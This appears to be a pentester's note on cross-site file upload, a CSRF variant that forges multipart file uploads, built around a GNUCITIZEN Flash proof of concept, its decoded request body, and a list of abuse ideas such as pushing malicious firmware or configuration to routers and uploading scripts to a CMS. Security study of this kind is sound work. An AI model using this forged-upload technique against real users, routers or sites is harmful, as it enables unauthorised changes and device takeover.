# Exploit Chaining

## Cross-Site File Upload

TODO: Find an existing vulnerability related to **Cross-Site File Upload** since this is pretty much old.

The reason CSRF attacks against file uploads are not possible is because the HTML FORM specifications are not versatile enough to define sub-fields like `filename="whatever.txt"`, which are vital parts of the `multipart/form-data` specifications when submitting files. This is the only restriction and I will show you that attackers can easily overcome it with a bit of help from Flash.

```
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" creationComplete="onAppInit()">
  <mx:Script>
    /* by Petko D. Petkov; pdp
    * GNUCITIZEN
    **/
    import flash.net.*;

    private function onAppInit():void
    {
      var r:URLRequest = new URLRequest('http://victim.com/upload.php');

      r.method = 'POST';
      r.data = unescape('-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22file%22%3B filename%3D%22gc.txt%22%0D%0AContent-Type%3A text%2Fplain%0D%0A%0D%0AHi from GNUCITIZEN%21%0D%0A-----------------------------109092118919201%0D%0AContent-Disposition%3A form-data%3B name%3D%22submit%22%0D%0A%0D%0ASubmit Query%0D%0A-----------------------------109092118919201--%0A');
      r.contentType = 'multipart/form-data; boundary=---------------------------109092118919201';

      navigateToURL(r, '_self');
    }
  </mx:Script>
</mx:Application>
```

If you carefully read the content of the script you will notice that we are preparing an URLRequest object which we load with a POST method, a `contentType` which equals to `multipart/form-data` and a URL encoded data text. If we `unencode` the text we get the following result. Now let's have a look at it as well. Notice the `filename="gc.txt"` field:

```
-----------------------------109092118919201
Content-Disposition: form-data; name="file"; filename="gc.txt"
Content-Type: text/plain

Hi from GNUCITIZEN!
-----------------------------109092118919201
Content-Disposition: form-data; name="submit"

Submit Query
-----------------------------109092118919201--
```

This looks like a valid `multipart/form-data` file upload, doesn't it? If you compile and execute the code you will see that the file upload is completely valid and will upload a file called `gc.txt` with content of `Hi from GNUCITIZEN!`.

- Upload a nasty picture on someone's profile - I admit this is not very useful but still very funny and open for abuse.
- Upload a shiny new firmware to the router that is under attack by using the user as a proxy. This is pretty nasty and given the fact that there are numerous authentication bypass and A-to-C bugs floating around, it is very, very feasible.
- Upload a shiny new configuration file on the router that is under attack. Same as the one above - very feasible and easy to perform.
- Upload executable scripts on CMS - this of course is a bit more targeted.

---
## References

- [GNUCitizen: Hacking The Interwebs](http://www.gnucitizen.org/blog/hacking-the-interwebs/)

- [GNUCitizen: Flash UPnP Attack FAQ](http://www.gnucitizen.org/blog/flash-upnp-attack-faq/)